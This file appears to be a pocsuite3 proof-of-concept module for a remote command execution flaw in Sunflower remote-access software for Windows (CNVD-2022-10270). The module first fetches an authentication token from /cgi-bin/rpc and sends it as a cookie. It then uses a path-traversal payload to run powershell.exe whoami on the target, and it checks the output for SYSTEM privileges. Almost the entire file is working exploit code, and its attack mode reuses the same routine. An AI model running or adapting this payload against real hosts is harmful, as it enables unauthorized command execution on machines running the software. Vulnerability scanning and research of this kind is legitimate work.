# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
import re
from urllib.parse import urlparse

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class sunflower_RCE_POC(POCBase):
    vulID = 'CNVD-2022-10270'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-02-15'
    createDate = '2022-02-15'
    updateDate = '2022-02-15'
    references = ['']
    name = 'sunflower_RCE'
    appPowerLink = ''
    appName = 'sunflower for Windows'
    appVersion = """Sunflower Personal edition for Windows <= 11.0.0.33
    Sunflower Reduced version <= V1.0.1.43315"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Shanghai Bayray Information Technology Co., Ltd. has command execution vulnerability in Sunflower Personal Edition for Windows'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url
        if target:
            try:
                self.timeout = 5
                vulurl = target + "/cgi-bin/rpc"
                parse = urlparse(vulurl)
                headers = {
                    "Host": "{}".format(parse.netloc)
                }
                data = "action=verify-haras"
                
                resq = requests.post(vulurl, headers=headers, timeout=self.timeout, data=data,verify=False)
                print ("resq.txt")
                c = json.loads(resq.text)
                verify_string = c['verify_string']
                if resq.status_code == 200:
                    if "verify_string" in resq.text:
                        cookies = "CID=" + verify_string
                        pocurl = target + "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+whoami"
                        header = {
                            "Cookie": "{}".format(cookies)
                        }
                        resp = requests.get(pocurl, headers=header,timeout=self.timeout,verify=False)
                        if "system" in resp.text or "authority" in resp.text:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = target
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(sunflower_RCE_POC)
